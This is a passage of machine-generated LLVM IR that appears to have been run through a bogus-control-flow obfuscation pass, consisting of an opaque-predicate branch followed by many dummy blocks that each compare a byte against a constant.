  %5286 = load i32, i32* @x.57
  %5287 = load i32, i32* @y.58
  %5288 = sub i32 %5286, 1
  %5289 = mul i32 %5286, %5288
  %5290 = urem i32 %5289, 2
  %5291 = icmp eq i32 %5290, 0
  %5292 = icmp slt i32 %5287, 10
  %5293 = or i1 %5291, %5292
  br i1 %5293, label %originalBBpart2767, label %originalBB734alteredBB

originalBBpart2767:                               ; preds = %originalBB734
  ret i32 %5285

originalBBalteredBB:                              ; preds = %originalBB, %39
  %5294 = load i8, i8* %2, align 1
  %5295 = zext i8 %5294 to i32
  %5296 = icmp eq i32 %5295, 56
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %67
  %5297 = load i8, i8* %2, align 1
  %5298 = zext i8 %5297 to i32
  %5299 = icmp eq i32 %5298, 49
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %91
  %5300 = load i8, i8* %2, align 1
  %5301 = zext i8 %5300 to i32
  %5302 = icmp eq i32 %5301, 137
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %115
  %5303 = load i8, i8* %2, align 1
  %5304 = zext i8 %5303 to i32
  %5305 = icmp eq i32 %5304, 7
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %135
  %5306 = load i8, i8* %2, align 1
  %5307 = zext i8 %5306 to i32
  %5308 = icmp eq i32 %5307, 11
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %163
  %5309 = load i8, i8* %2, align 1
  %5310 = zext i8 %5309 to i32
  %5311 = icmp eq i32 %5310, 26
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %183
  %5312 = load i8, i8* %2, align 1
  %5313 = zext i8 %5312 to i32
  %5314 = icmp eq i32 %5313, 28
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %211
  %5315 = load i8, i8* %2, align 1
  %5316 = zext i8 %5315 to i32
  %5317 = icmp eq i32 %5316, 33
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %231
  %5318 = load i8, i8* %2, align 1
  %5319 = zext i8 %5318 to i32
  %5320 = icmp eq i32 %5319, 55
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %259
  %5321 = load i8, i8* %2, align 1
  %5322 = zext i8 %5321 to i32
  %5323 = icmp eq i32 %5322, 192
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %287
  %5324 = load i8, i8* %3, align 1
  %5325 = zext i8 %5324 to i32
  %5326 = icmp eq i32 %5325, 17
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %311
  %5327 = load i8, i8* %3, align 1
  %5328 = zext i8 %5327 to i32
  %5329 = icmp eq i32 %5328, 80
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %335
  %5330 = load i8, i8* %3, align 1
  %5331 = zext i8 %5330 to i32
  %5332 = icmp eq i32 %5331, 98
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %355
  %5333 = load i8, i8* %2, align 1
  %5334 = zext i8 %5333 to i32
  %5335 = icmp eq i32 %5334, 146
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %375
  %5336 = load i8, i8* %3, align 1
  %5337 = zext i8 %5336 to i32
  %5338 = icmp eq i32 %5337, 154
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %399
  %5339 = load i8, i8* %3, align 1
  %5340 = zext i8 %5339 to i32
  %5341 = icmp eq i32 %5340, 159
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %419
  %5342 = load i8, i8* %2, align 1
  %5343 = zext i8 %5342 to i32
  %5344 = icmp eq i32 %5343, 148
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %495
  %5345 = load i8, i8* %3, align 1
  %5346 = zext i8 %5345 to i32
  %5347 = icmp eq i32 %5346, 190
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %559
  %5348 = load i8, i8* %3, align 1
  %5349 = zext i8 %5348 to i32
  %5350 = icmp eq i32 %5349, 124
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %579
  %5351 = load i8, i8* %2, align 1
  %5352 = zext i8 %5351 to i32
  %5353 = icmp eq i32 %5352, 162
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %603
  %5354 = load i8, i8* %2, align 1
  %5355 = zext i8 %5354 to i32
  %5356 = icmp eq i32 %5355, 155
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %655
  %5357 = load i8, i8* %3, align 1
  %5358 = zext i8 %5357 to i32
  %5359 = icmp eq i32 %5358, 158
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %675
  %5360 = load i8, i8* %2, align 1
  %5361 = zext i8 %5360 to i32
  %5362 = icmp eq i32 %5361, 156
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %695
  %5363 = load i8, i8* %3, align 1
  %5364 = zext i8 %5363 to i32
  %5365 = icmp eq i32 %5364, 9
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %731
  %5366 = load i8, i8* %2, align 1
  %5367 = zext i8 %5366 to i32
  %5368 = icmp eq i32 %5367, 168
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %779
  %5369 = load i8, i8* %2, align 1
  %5370 = zext i8 %5369 to i32
  %5371 = icmp eq i32 %5370, 207
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %803
  %5372 = load i8, i8* %2, align 1
  %5373 = zext i8 %5372 to i32
  %5374 = icmp eq i32 %5373, 117
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %827
  %5375 = load i8, i8* %2, align 1
  %5376 = zext i8 %5375 to i32
  %5377 = icmp eq i32 %5376, 117
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %855
  %5378 = load i8, i8* %3, align 1
  %5379 = zext i8 %5378 to i32
  %5380 = icmp eq i32 %5379, 235
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %875
  %5381 = load i8, i8* %2, align 1
  %5382 = zext i8 %5381 to i32
  %5383 = icmp eq i32 %5382, 207
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %895
  %5384 = load i8, i8* %3, align 1
  %5385 = zext i8 %5384 to i32
  %5386 = icmp eq i32 %5385, 120
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %919
  %5387 = load i8, i8* %3, align 1
  %5388 = zext i8 %5387 to i32
  %5389 = icmp eq i32 %5388, 35
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %947
  %5390 = load i8, i8* %2, align 1
  %5391 = zext i8 %5390 to i32
  %5392 = icmp eq i32 %5391, 172
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %971
  %5393 = load i8, i8* %3, align 1
  %5394 = zext i8 %5393 to i32
  %5395 = icmp slt i32 %5394, 32
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %995
  %5396 = load i8, i8* %3, align 1
  %5397 = zext i8 %5396 to i32
  %5398 = icmp sge i32 %5397, 64
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %1047
  %5399 = load i8, i8* %3, align 1
  %5400 = zext i8 %5399 to i32
  %5401 = icmp slt i32 %5400, 227
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %1099
  %5402 = load i8, i8* %3, align 1
  %5403 = zext i8 %5402 to i32
  %5404 = icmp slt i32 %5403, 168
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %1127
  %5405 = load i8, i8* %3, align 1
  %5406 = zext i8 %5405 to i32
  %5407 = icmp slt i32 %5406, 251
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %1147
  %5408 = load i8, i8* %2, align 1
  %5409 = zext i8 %5408 to i32
  %5410 = icmp eq i32 %5409, 132
  br label %originalBB150

originalBB154alteredBB:                           ; preds = %originalBB154, %1171
  %5411 = load i8, i8* %3, align 1
  %5412 = zext i8 %5411 to i32
  %5413 = icmp slt i32 %5412, 251
  br label %originalBB154

originalBB158alteredBB:                           ; preds = %originalBB158, %1203
  %5414 = load i8, i8* %2, align 1
  %5415 = zext i8 %5414 to i32
  %5416 = icmp eq i32 %5415, 136
  br label %originalBB158

originalBB162alteredBB:                           ; preds = %originalBB162, %1223
  %5417 = load i8, i8* %3, align 1
  %5418 = zext i8 %5417 to i32
  %5419 = icmp sge i32 %5418, 177
  br label %originalBB162

originalBB166alteredBB:                           ; preds = %originalBB166, %1247
  %5420 = load i8, i8* %2, align 1
  %5421 = zext i8 %5420 to i32
  %5422 = icmp eq i32 %5421, 138
  br label %originalBB166

originalBB170alteredBB:                           ; preds = %originalBB170, %1267
  %5423 = load i8, i8* %3, align 1
  %5424 = zext i8 %5423 to i32
  %5425 = icmp sge i32 %5424, 13
  br label %originalBB170

originalBB174alteredBB:                           ; preds = %originalBB174, %1299
  %5426 = load i8, i8* %3, align 1
  %5427 = zext i8 %5426 to i32
  %5428 = icmp slt i32 %5427, 143
  br label %originalBB174

originalBB178alteredBB:                           ; preds = %originalBB178, %1323
  %5429 = load i8, i8* %3, align 1
  %5430 = zext i8 %5429 to i32
  %5431 = icmp sge i32 %5430, 1
  br label %originalBB178

originalBB182alteredBB:                           ; preds = %originalBB182, %1359
  %5432 = load i8, i8* %2, align 1
  %5433 = zext i8 %5432 to i32
  %5434 = icmp eq i32 %5433, 144
  br label %originalBB182

originalBB186alteredBB:                           ; preds = %originalBB186, %1379
  %5435 = load i8, i8* %3, align 1
  %5436 = zext i8 %5435 to i32
  %5437 = icmp sge i32 %5436, 99
  br label %originalBB186

originalBB190alteredBB:                           ; preds = %originalBB190, %1415
  %5438 = load i8, i8* %2, align 1
  %5439 = zext i8 %5438 to i32
  %5440 = icmp eq i32 %5439, 147
  br label %originalBB190

originalBB194alteredBB:                           ; preds = %originalBB194, %1443
  %5441 = load i8, i8* %2, align 1
  %5442 = zext i8 %5441 to i32
  %5443 = icmp eq i32 %5442, 147
  br label %originalBB194

originalBB198alteredBB:                           ; preds = %originalBB198, %1471
  %5444 = load i8, i8* %2, align 1
  %5445 = zext i8 %5444 to i32
  %5446 = icmp eq i32 %5445, 147
  br label %originalBB198

originalBB202alteredBB:                           ; preds = %originalBB202, %1499
  %5447 = load i8, i8* %2, align 1
  %5448 = zext i8 %5447 to i32
  %5449 = icmp eq i32 %5448, 147
  br label %originalBB202

originalBB206alteredBB:                           ; preds = %originalBB206, %1531
  %5450 = load i8, i8* %3, align 1
  %5451 = zext i8 %5450 to i32
  %5452 = icmp sge i32 %5451, 238
  br label %originalBB206

originalBB210alteredBB:                           ; preds = %originalBB210, %1551
  %5453 = load i8, i8* %3, align 1
  %5454 = zext i8 %5453 to i32
  %5455 = icmp slt i32 %5454, 255
  br label %originalBB210

originalBB214alteredBB:                           ; preds = %originalBB214, %1579
  %5456 = load i8, i8* %3, align 1
  %5457 = zext i8 %5456 to i32
  %5458 = icmp slt i32 %5457, 115
  br label %originalBB214

originalBB218alteredBB:                           ; preds = %originalBB218, %1639
  %5459 = load i8, i8* %3, align 1
  %5460 = zext i8 %5459 to i32
  %5461 = icmp sge i32 %5460, 74
  br label %originalBB218

originalBB222alteredBB:                           ; preds = %originalBB222, %1667
  %5462 = load i8, i8* %3, align 1
  %5463 = zext i8 %5462 to i32
  %5464 = icmp sge i32 %5463, 213
  br label %originalBB222

originalBB226alteredBB:                           ; preds = %originalBB226, %1739
  %5465 = load i8, i8* %2, align 1
  %5466 = zext i8 %5465 to i32
  %5467 = icmp eq i32 %5466, 160
  br label %originalBB226

originalBB230alteredBB:                           ; preds = %originalBB230, %1763
  %5468 = load i8, i8* %3, align 1
  %5469 = zext i8 %5468 to i32
  %5470 = icmp slt i32 %5469, 151
  br label %originalBB230

originalBB234alteredBB:                           ; preds = %originalBB234, %1807
  %5471 = load i8, i8* %2, align 1
  %5472 = zext i8 %5471 to i32
  %5473 = icmp eq i32 %5472, 163
  br label %originalBB234

originalBB238alteredBB:                           ; preds = %originalBB238, %1831
  %5474 = load i8, i8* %3, align 1
  %5475 = zext i8 %5474 to i32
  %5476 = icmp slt i32 %5475, 207
  br label %originalBB238

originalBB242alteredBB:                           ; preds = %originalBB242, %1867
  %5477 = load i8, i8* %3, align 1
  %5478 = zext i8 %5477 to i32
  %5479 = icmp sge i32 %5478, 217
  br label %originalBB242

originalBB246alteredBB:                           ; preds = %originalBB246, %1891
  %5480 = load i8, i8* %2, align 1
  %5481 = zext i8 %5480 to i32
  %5482 = icmp eq i32 %5481, 169
  br label %originalBB246

originalBB250alteredBB:                           ; preds = %originalBB250, %1923
  %5483 = load i8, i8* %3, align 1
  %5484 = zext i8 %5483 to i32
  %5485 = icmp sge i32 %5484, 121
  br label %originalBB250

originalBB254alteredBB:                           ; preds = %originalBB254, %1943
  %5486 = load i8, i8* %3, align 1
  %5487 = zext i8 %5486 to i32
  %5488 = icmp slt i32 %5487, 254
  br label %originalBB254

originalBB258alteredBB:                           ; preds = %originalBB258, %1995
  %5489 = load i8, i8* %3, align 1
  %5490 = zext i8 %5489 to i32
  %5491 = icmp slt i32 %5490, 31
  br label %originalBB258

originalBB262alteredBB:                           ; preds = %originalBB262, %2035
  %5492 = load i8, i8* %3, align 1
  %5493 = zext i8 %5492 to i32
  %5494 = icmp eq i32 %5493, 203
  br label %originalBB262

originalBB266alteredBB:                           ; preds = %originalBB266, %2055
  %5495 = load i8, i8* %2, align 1
  %5496 = zext i8 %5495 to i32
  %5497 = icmp eq i32 %5496, 162
  br label %originalBB266

originalBB270alteredBB:                           ; preds = %originalBB270, %2075
  %5498 = load i8, i8* %3, align 1
  %5499 = zext i8 %5498 to i32
  %5500 = icmp eq i32 %5499, 243
  br label %originalBB270

originalBB274alteredBB:                           ; preds = %originalBB274, %2095
  %5501 = load i8, i8* %2, align 1
  %5502 = zext i8 %5501 to i32
  %5503 = icmp eq i32 %5502, 45
  br label %originalBB274

originalBB278alteredBB:                           ; preds = %originalBB278, %2123
  %5504 = load i8, i8* %3, align 1
  %5505 = zext i8 %5504 to i32
  %5506 = icmp eq i32 %5505, 62
  br label %originalBB278

originalBB282alteredBB:                           ; preds = %originalBB282, %2143
  %5507 = load i8, i8* %2, align 1
  %5508 = zext i8 %5507 to i32
  %5509 = icmp eq i32 %5508, 104
  br label %originalBB282

originalBB286alteredBB:                           ; preds = %originalBB286, %2179
  %5510 = load i8, i8* %3, align 1
  %5511 = zext i8 %5510 to i32
  %5512 = icmp eq i32 %5511, 170
  br label %originalBB286

originalBB290alteredBB:                           ; preds = %originalBB290, %2215
  %5513 = load i8, i8* %2, align 1
  %5514 = zext i8 %5513 to i32
  %5515 = icmp eq i32 %5514, 139
  br label %originalBB290

originalBB294alteredBB:                           ; preds = %originalBB294, %2243
  %5516 = load i8, i8* %3, align 1
  %5517 = zext i8 %5516 to i32
  %5518 = icmp eq i32 %5517, 185
  br label %originalBB294

originalBB298alteredBB:                           ; preds = %originalBB298, %2271
  %5519 = load i8, i8* %2, align 1
  %5520 = zext i8 %5519 to i32
  %5521 = icmp eq i32 %5520, 163
  br label %originalBB298

originalBB302alteredBB:                           ; preds = %originalBB302, %2291
  %5522 = load i8, i8* %3, align 1
  %5523 = zext i8 %5522 to i32
  %5524 = icmp eq i32 %5523, 47
  br label %originalBB302

originalBB306alteredBB:                           ; preds = %originalBB306, %2339
  %5525 = load i8, i8* %3, align 1
  %5526 = zext i8 %5525 to i32
  %5527 = icmp eq i32 %5526, 241
  br label %originalBB306

originalBB310alteredBB:                           ; preds = %originalBB310, %2375
  %5528 = load i8, i8* %4, align 1
  %5529 = zext i8 %5528 to i32
  %5530 = icmp sge i32 %5529, 64
  br label %originalBB310

originalBB314alteredBB:                           ; preds = %originalBB314, %2395
  %5531 = load i8, i8* %4, align 1
  %5532 = zext i8 %5531 to i32
  %5533 = icmp slt i32 %5532, 127
  br label %originalBB314

originalBB318alteredBB:                           ; preds = %originalBB318, %2427
  %5534 = load i8, i8* %4, align 1
  %5535 = zext i8 %5534 to i32
  %5536 = icmp slt i32 %5535, 127
  br label %originalBB318

originalBB322alteredBB:                           ; preds = %originalBB322, %2451
  %5537 = load i8, i8* %3, align 1
  %5538 = zext i8 %5537 to i32
  %5539 = icmp eq i32 %5538, 154
  br label %originalBB322

originalBB326alteredBB:                           ; preds = %originalBB326, %2475
  %5540 = load i8, i8* %4, align 1
  %5541 = zext i8 %5540 to i32
  %5542 = icmp slt i32 %5541, 255
  br label %originalBB326

originalBB330alteredBB:                           ; preds = %originalBB330, %2499
  %5543 = load i8, i8* %3, align 1
  %5544 = zext i8 %5543 to i32
  %5545 = icmp eq i32 %5544, 139
  br label %originalBB330

originalBB334alteredBB:                           ; preds = %originalBB334, %2535
  %5546 = load i8, i8* %4, align 1
  %5547 = zext i8 %5546 to i32
  %5548 = icmp sge i32 %5547, 64
  br label %originalBB334

originalBB338alteredBB:                           ; preds = %originalBB338, %2559
  %5549 = load i8, i8* %2, align 1
  %5550 = zext i8 %5549 to i32
  %5551 = icmp eq i32 %5550, 67
  br label %originalBB338

originalBB342alteredBB:                           ; preds = %originalBB342, %2603
  %5552 = load i8, i8* %4, align 1
  %5553 = zext i8 %5552 to i32
  %5554 = icmp slt i32 %5553, 143
  br label %originalBB342

originalBB346alteredBB:                           ; preds = %originalBB346, %2655
  %5555 = load i8, i8* %2, align 1
  %5556 = zext i8 %5555 to i32
  %5557 = icmp eq i32 %5556, 64
  br label %originalBB346

originalBB350alteredBB:                           ; preds = %originalBB350, %2679
  %5558 = load i8, i8* %4, align 1
  %5559 = zext i8 %5558 to i32
  %5560 = icmp sge i32 %5559, 32
  br label %originalBB350

originalBB354alteredBB:                           ; preds = %originalBB354, %2703
  %5561 = load i8, i8* %2, align 1
  %5562 = zext i8 %5561 to i32
  %5563 = icmp eq i32 %5562, 185
  br label %originalBB354

originalBB358alteredBB:                           ; preds = %originalBB358, %2735
  %5564 = load i8, i8* %2, align 1
  %5565 = zext i8 %5564 to i32
  %5566 = icmp eq i32 %5565, 104
  br label %originalBB358

originalBB362alteredBB:                           ; preds = %originalBB362, %2759
  %5567 = load i8, i8* %4, align 1
  %5568 = zext i8 %5567 to i32
  %5569 = icmp sge i32 %5568, 128
  br label %originalBB362

originalBB366alteredBB:                           ; preds = %originalBB366, %2779
  %5570 = load i8, i8* %4, align 1
  %5571 = zext i8 %5570 to i32
  %5572 = icmp slt i32 %5571, 191
  br label %originalBB366

originalBB370alteredBB:                           ; preds = %originalBB370, %2815
  %5573 = load i8, i8* %2, align 1
  %5574 = zext i8 %5573 to i32
  %5575 = icmp eq i32 %5574, 208
  br label %originalBB370

originalBB374alteredBB:                           ; preds = %originalBB374, %2863
  %5576 = load i8, i8* %2, align 1
  %5577 = zext i8 %5576 to i32
  %5578 = icmp eq i32 %5577, 45
  br label %originalBB374

originalBB378alteredBB:                           ; preds = %originalBB378, %2883
  %5579 = load i8, i8* %3, align 1
  %5580 = zext i8 %5579 to i32
  %5581 = icmp eq i32 %5580, 63
  br label %originalBB378

originalBB382alteredBB:                           ; preds = %originalBB382, %2903
  %5582 = load i8, i8* %4, align 1
  %5583 = zext i8 %5582 to i32
  %5584 = icmp sge i32 %5583, 1
  br label %originalBB382

originalBB386alteredBB:                           ; preds = %originalBB386, %2927
  %5585 = load i8, i8* %2, align 1
  %5586 = zext i8 %5585 to i32
  %5587 = icmp eq i32 %5586, 216
  br label %originalBB386

originalBB390alteredBB:                           ; preds = %originalBB390, %2947
  %5588 = load i8, i8* %3, align 1
  %5589 = zext i8 %5588 to i32
  %5590 = icmp eq i32 %5589, 237
  br label %originalBB390

originalBB394alteredBB:                           ; preds = %originalBB394, %2975
  %5591 = load i8, i8* %2, align 1
  %5592 = zext i8 %5591 to i32
  %5593 = icmp eq i32 %5592, 108
  br label %originalBB394

originalBB398alteredBB:                           ; preds = %originalBB398, %2995
  %5594 = load i8, i8* %3, align 1
  %5595 = zext i8 %5594 to i32
  %5596 = icmp eq i32 %5595, 61
  br label %originalBB398

originalBB402alteredBB:                           ; preds = %originalBB402, %3015
  %5597 = load i8, i8* %2, align 1
  %5598 = zext i8 %5597 to i32
  %5599 = icmp eq i32 %5598, 45
  br label %originalBB402

originalBB406alteredBB:                           ; preds = %originalBB406, %3035
  %5600 = load i8, i8* %3, align 1
  %5601 = zext i8 %5600 to i32
  %5602 = icmp eq i32 %5601, 76
  br label %originalBB406

originalBB410alteredBB:                           ; preds = %originalBB410, %3067
  %5603 = load i8, i8* %4, align 1
  %5604 = zext i8 %5603 to i32
  %5605 = icmp slt i32 %5604, 148
  br label %originalBB410

originalBB414alteredBB:                           ; preds = %originalBB414, %3103
  %5606 = load i8, i8* %2, align 1
  %5607 = zext i8 %5606 to i32
  %5608 = icmp eq i32 %5607, 185
  br label %originalBB414

originalBB418alteredBB:                           ; preds = %originalBB418, %3127
  %5609 = load i8, i8* %4, align 1
  %5610 = zext i8 %5609 to i32
  %5611 = icmp sge i32 %5610, 136
  br label %originalBB418

originalBB422alteredBB:                           ; preds = %originalBB422, %3147
  %5612 = load i8, i8* %4, align 1
  %5613 = zext i8 %5612 to i32
  %5614 = icmp slt i32 %5613, 139
  br label %originalBB422

originalBB426alteredBB:                           ; preds = %originalBB426, %3171
  %5615 = load i8, i8* %3, align 1
  %5616 = zext i8 %5615 to i32
  %5617 = icmp eq i32 %5616, 62
  br label %originalBB426

originalBB430alteredBB:                           ; preds = %originalBB430, %3199
  %5618 = load i8, i8* %2, align 1
  %5619 = zext i8 %5618 to i32
  %5620 = icmp eq i32 %5619, 66
  br label %originalBB430

originalBB434alteredBB:                           ; preds = %originalBB434, %3267
  %5621 = load i8, i8* %3, align 1
  %5622 = zext i8 %5621 to i32
  %5623 = icmp eq i32 %5622, 251
  br label %originalBB434

originalBB438alteredBB:                           ; preds = %originalBB438, %3287
  %5624 = load i8, i8* %4, align 1
  %5625 = zext i8 %5624 to i32
  %5626 = icmp sge i32 %5625, 19
  br label %originalBB438

originalBB442alteredBB:                           ; preds = %originalBB442, %3319
  %5627 = load i8, i8* %4, align 1
  %5628 = zext i8 %5627 to i32
  %5629 = icmp sge i32 %5628, 73
  br label %originalBB442

originalBB446alteredBB:                           ; preds = %originalBB446, %3339
  %5630 = load i8, i8* %4, align 1
  %5631 = zext i8 %5630 to i32
  %5632 = icmp slt i32 %5631, 75
  br label %originalBB446

originalBB450alteredBB:                           ; preds = %originalBB450, %3359
  %5633 = load i8, i8* %2, align 1
  %5634 = zext i8 %5633 to i32
  %5635 = icmp eq i32 %5634, 74
  br label %originalBB450

originalBB454alteredBB:                           ; preds = %originalBB454, %3379
  %5636 = load i8, i8* %3, align 1
  %5637 = zext i8 %5636 to i32
  %5638 = icmp eq i32 %5637, 91
  br label %originalBB454

originalBB458alteredBB:                           ; preds = %originalBB458, %3399
  %5639 = load i8, i8* %4, align 1
  %5640 = zext i8 %5639 to i32
  %5641 = icmp sge i32 %5640, 113
  br label %originalBB458

originalBB462alteredBB:                           ; preds = %originalBB462, %3423
  %5642 = load i8, i8* %2, align 1
  %5643 = zext i8 %5642 to i32
  %5644 = icmp eq i32 %5643, 74
  br label %originalBB462

originalBB466alteredBB:                           ; preds = %originalBB466, %3447
  %5645 = load i8, i8* %4, align 1
  %5646 = zext i8 %5645 to i32
  %5647 = icmp sge i32 %5646, 56
  br label %originalBB466

originalBB470alteredBB:                           ; preds = %originalBB470, %3499
  %5648 = load i8, i8* %3, align 1
  %5649 = zext i8 %5648 to i32
  %5650 = icmp eq i32 %5649, 202
  br label %originalBB470

originalBB474alteredBB:                           ; preds = %originalBB474, %3519
  %5651 = load i8, i8* %2, align 1
  %5652 = zext i8 %5651 to i32
  %5653 = icmp eq i32 %5652, 151
  br label %originalBB474

originalBB478alteredBB:                           ; preds = %originalBB478, %3539
  %5654 = load i8, i8* %3, align 1
  %5655 = zext i8 %5654 to i32
  %5656 = icmp eq i32 %5655, 80
  br label %originalBB478

originalBB482alteredBB:                           ; preds = %originalBB482, %3559
  %5657 = load i8, i8* %2, align 1
  %5658 = zext i8 %5657 to i32
  %5659 = icmp eq i32 %5658, 164
  br label %originalBB482

originalBB486alteredBB:                           ; preds = %originalBB486, %3603
  %5660 = load i8, i8* %3, align 1
  %5661 = zext i8 %5660 to i32
  %5662 = icmp eq i32 %5661, 32
  br label %originalBB486

originalBB490alteredBB:                           ; preds = %originalBB490, %3651
  %5663 = load i8, i8* %3, align 1
  %5664 = zext i8 %5663 to i32
  %5665 = icmp eq i32 %5664, 105
  br label %originalBB490

originalBB494alteredBB:                           ; preds = %originalBB494, %3671
  %5666 = load i8, i8* %2, align 1
  %5667 = zext i8 %5666 to i32
  %5668 = icmp eq i32 %5667, 51
  br label %originalBB494

originalBB498alteredBB:                           ; preds = %originalBB498, %3695
  %5669 = load i8, i8* %2, align 1
  %5670 = zext i8 %5669 to i32
  %5671 = icmp eq i32 %5670, 51
  br label %originalBB498

originalBB502alteredBB:                           ; preds = %originalBB502, %3735
  %5672 = load i8, i8* %2, align 1
  %5673 = zext i8 %5672 to i32
  %5674 = icmp eq i32 %5673, 5
  br label %originalBB502

originalBB506alteredBB:                           ; preds = %originalBB506, %3755
  %5675 = load i8, i8* %3, align 1
  %5676 = zext i8 %5675 to i32
  %5677 = icmp eq i32 %5676, 39
  br label %originalBB506

originalBB510alteredBB:                           ; preds = %originalBB510, %3783
  %5678 = load i8, i8* %2, align 1
  %5679 = zext i8 %5678 to i32
  %5680 = icmp eq i32 %5679, 104
  br label %originalBB510

originalBB514alteredBB:                           ; preds = %originalBB514, %3807
  %5681 = load i8, i8* %4, align 1
  %5682 = zext i8 %5681 to i32
  %5683 = icmp sge i32 %5682, 128
  br label %originalBB514

originalBB518alteredBB:                           ; preds = %originalBB518, %3847
  %5684 = load i8, i8* %2, align 1
  %5685 = zext i8 %5684 to i32
  %5686 = icmp eq i32 %5685, 107
  br label %originalBB518

originalBB522alteredBB:                           ; preds = %originalBB522, %3875
  %5687 = load i8, i8* %4, align 1
  %5688 = zext i8 %5687 to i32
  %5689 = icmp slt i32 %5688, 189
  br label %originalBB522

originalBB526alteredBB:                           ; preds = %originalBB526, %3903
  %5690 = load i8, i8* %4, align 1
  %5691 = zext i8 %5690 to i32
  %5692 = icmp sge i32 %5691, 64
  br label %originalBB526

originalBB530alteredBB:                           ; preds = %originalBB530, %3931
  %5693 = load i8, i8* %3, align 1
  %5694 = zext i8 %5693 to i32
  %5695 = icmp eq i32 %5694, 170
  br label %originalBB530

originalBB534alteredBB:                           ; preds = %originalBB534, %3975
  %5696 = load i8, i8* %2, align 1
  %5697 = zext i8 %5696 to i32
  %5698 = icmp eq i32 %5697, 192
  br label %originalBB534

originalBB538alteredBB:                           ; preds = %originalBB538, %3995
  %5699 = load i8, i8* %3, align 1
  %5700 = zext i8 %5699 to i32
  %5701 = icmp eq i32 %5700, 252
  br label %originalBB538

originalBB542alteredBB:                           ; preds = %originalBB542, %4027
  %5702 = load i8, i8* %3, align 1
  %5703 = zext i8 %5702 to i32
  %5704 = icmp eq i32 %5703, 40
  br label %originalBB542

originalBB546alteredBB:                           ; preds = %originalBB546, %4051
  %5705 = load i8, i8* %4, align 1
  %5706 = zext i8 %5705 to i32
  %5707 = icmp slt i32 %5706, 59
  br label %originalBB546

originalBB550alteredBB:                           ; preds = %originalBB550, %4071
  %5708 = load i8, i8* %2, align 1
  %5709 = zext i8 %5708 to i32
  %5710 = icmp eq i32 %5709, 198
  br label %originalBB550

originalBB554alteredBB:                           ; preds = %originalBB554, %4091
  %5711 = load i8, i8* %3, align 1
  %5712 = zext i8 %5711 to i32
  %5713 = icmp eq i32 %5712, 8
  br label %originalBB554

originalBB558alteredBB:                           ; preds = %originalBB558, %4123
  %5714 = load i8, i8* %3, align 1
  %5715 = zext i8 %5714 to i32
  %5716 = icmp eq i32 %5715, 116
  br label %originalBB558

originalBB562alteredBB:                           ; preds = %originalBB562, %4151
  %5717 = load i8, i8* %2, align 1
  %5718 = zext i8 %5717 to i32
  %5719 = icmp eq i32 %5718, 199
  br label %originalBB562

originalBB566alteredBB:                           ; preds = %originalBB566, %4175
  %5720 = load i8, i8* %4, align 1
  %5721 = zext i8 %5720 to i32
  %5722 = icmp sge i32 %5721, 248
  br label %originalBB566

originalBB570alteredBB:                           ; preds = %originalBB570, %4199
  %5723 = load i8, i8* %2, align 1
  %5724 = zext i8 %5723 to i32
  %5725 = icmp eq i32 %5724, 199
  br label %originalBB570

originalBB574alteredBB:                           ; preds = %originalBB574, %4223
  %5726 = load i8, i8* %4, align 1
  %5727 = zext i8 %5726 to i32
  %5728 = icmp sge i32 %5727, 220
  br label %originalBB574

originalBB578alteredBB:                           ; preds = %originalBB578, %4247
  %5729 = load i8, i8* %2, align 1
  %5730 = zext i8 %5729 to i32
  %5731 = icmp eq i32 %5730, 199
  br label %originalBB578

originalBB582alteredBB:                           ; preds = %originalBB582, %4275
  %5732 = load i8, i8* %4, align 1
  %5733 = zext i8 %5732 to i32
  %5734 = icmp slt i32 %5733, 187
  br label %originalBB582

originalBB586alteredBB:                           ; preds = %originalBB586, %4295
  %5735 = load i8, i8* %2, align 1
  %5736 = zext i8 %5735 to i32
  %5737 = icmp eq i32 %5736, 206
  br label %originalBB586

originalBB590alteredBB:                           ; preds = %originalBB590, %4319
  %5738 = load i8, i8* %4, align 1
  %5739 = zext i8 %5738 to i32
  %5740 = icmp sge i32 %5739, 172
  br label %originalBB590

originalBB594alteredBB:                           ; preds = %originalBB594, %4339
  %5741 = load i8, i8* %4, align 1
  %5742 = zext i8 %5741 to i32
